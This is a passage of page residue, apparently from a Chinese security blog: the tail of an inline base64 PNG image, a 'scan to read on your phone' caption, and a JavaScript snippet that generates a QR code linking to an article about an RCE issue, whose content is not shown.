aUcdk24aILhKyb3DKtePngt+bFhIEksfM0JXA4EPEWg7RDYnk4wtkRxwLk8MSU1uDDXplYI1qRY3Jn1msQV4dgvudoz3B0E9wNjasAx7JhcEPbc5UBStPB3TuD0Tyd5UmbbSC4YTWJhOPD0E1eUThYOjlpwDERyuJmw801QHOCgL6n2J45w2ocscUVwn8rJlz6m+MrOtOGF64ZcneIv59dAfvnAr5Zrf8vSdZH1BeJ6g+MVTh7Mw/i2Epyr/cFc6oMw8rVOfrTyZTJwHRjFnRlYA8bowDGMr2GmAetn+5E+vBCsFX9m64acncyL+GEgcD1FTVsGR624GDgHxmevD641fT2MNVn7DPseiqOVL0ssBK8BRuXPDKxRnQwcV714WeXkg7XA+n9QPd7sa3jbqwnKsk/Yp9dz0snCz1B52Sz3J5x6ymDcX98XrOl5xeAcjKj+1cCacKqPhQNrws8QrElN1Qw/smpy+b9/Am0g4KnBEWdbmk2210UD7pc8OAZCDR/SkgDaB7tw6dvH4sH65ILKyRLPUPneogP3TR4cJ18xmmDNgeuSA8dV0wZSyeW/7gSGzyGZ3rMtwTjZZ3rl0rei+GrgvtHUXDiwBkaMHpxL/Ay/0jd9UpNYCF4TzlG6maWfcN2Q2Qm9kFsDeXr4v58c3vZmC7o+vfW5xOBrmrhieoA1sGNyVS8frJF/ZqmdYWrg2Kdqowkml7hicnDsN9NEG5xpwkUD7gusD4aPN/tqv9RhnxLc8/NaZpMG94gmGK0Q5pqZNlyP4B5AnxpioL2N1voyMDeIJ4T0skmqUXDdD44a9Yyt3yHtKN/DaQPJhO7gna2nD/hp6GOgtQG2JzealigOWFOozU2NcCMm/4BrpYmBucjBcfLC5IJgDRjDV1SdrHK9r7wM3Ad2bAPpi1b8mhMYBgL7tODof2WL4Nq+Rk9GLLnEcKwBx0CkDYHtVsGIEaVvMPxXEbxG6mb9wBo4YmqE4Jx8WfpUHAYi4bLXncAayOvOfrryXxkIHK+iVqrXUL44GVgL+3+zFj8z1cWSTxwMX/FZrurkRxsU11tyQfBr6HV3Yziv/ysDubuRpbs+gb8ykDw5z5YDPxXRCnu9OFnP1xjcp3LxVStLDNaCMfwzBGthv8Fg7lldclpflvgOgvsD608njzf7Gm6IpntmX9k77FOH/Wl71gNcEw04BkK1/7oIbG97617BXBN/OtF8hlMA10YrjFC+LPEMlZfNcuGUrzbjh4FEtPA1J9AGAn5C4BrPtlqn3/vgvme1V3z6XemUB6/1lRrVycC1sKP4maW/EHY9MJNvNxr2HLBxVdwGUsnlv+4E1kBed/bTlf8HAAD//6XjZZoAAAAGSURBVAMAqz+jj/sSJlwAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/salia-nwcheckexec-dest-topic-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 